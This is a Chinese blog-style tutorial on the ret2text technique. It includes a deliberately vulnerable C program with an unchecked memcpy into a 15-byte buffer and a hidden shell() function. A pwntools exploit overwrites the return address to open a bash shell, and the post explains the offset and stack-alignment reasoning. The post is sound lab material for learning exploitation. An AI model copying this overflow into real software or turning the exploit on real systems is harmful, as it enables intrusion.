---
title: ret2text
date: 2023-02-01 15:18:10
tags:
- pwn
- pwntools
- ret2text
---
### 机器环境
```shell
gcc version 11.3.0 (Debian 11.3.0-5)
debian11
Linux 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux
```

### test.c源码
* test.c
```c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

void shell(){
	system("/bin/bash");
}
void print_name(char *input){
	char buf[15];
	memcpy(buf,input,0x100);
	printf("Hello %s\n",buf);
}

int main(int argc,char **argv){
	char buf[0x100];
	puts("ck");
	read(0,buf,0x100);
	print_name(buf);
	return 0;
}
```
* 编译时注意关闭pie
```shell
gcc -no-pie test.c
```
* 目录树
```
.
├── a.out
└── test.c
```
### 步骤
1. 利用pwntools查看文件保护信息
```python
from pwn import *
elf=ELF('./a.out')
#result
[*] '/home/xxx/test/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
2. 使用ida打开a.out
3. 进入print_name函数中，查看buf分配大小![print_name](http://121.5.125.62/image/ret2text/1.PNG)，dest的rbp大小为0x0f。
4. 查看shell函数的地址![shell](http://121.5.125.62/image/ret2text/2.PNG)，shell函数的入口地址为0x040116。
5. Ubuntu18.04 64位 和 部分Ubuntu16.04 64位 调用system的时候，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。要解决这个问题，只要将返回地址设置为跳过函数开头的push rbp就可以了。
根据以上信息就可以写exp了。

### exp
```python
#python3
from pwn import * 
#加载a.out文件
elf=ELF('./a.out')
#context.terminal=['tmux','splitw','-h']

#进入程序
p=elf.process()
#输出程序加载地址
s=elf.sym["system"]
print(hex(s))
#b'a'为任意字节即可(python3用b'a'，python2用'a')
#长度23由buf的rbp大小0x0f，64位rbp大小8字节，相加即可
#0x0401167是shell入口地址去除首位指令
#32位程序用p32()函数，64位程序用p64()函数
p.send(b'a'*(23)+p64(0x0401167))
#交互
p.interactive()
```
### 结果
![res](http://121.5.125.62/image/ret2text/3.PNG)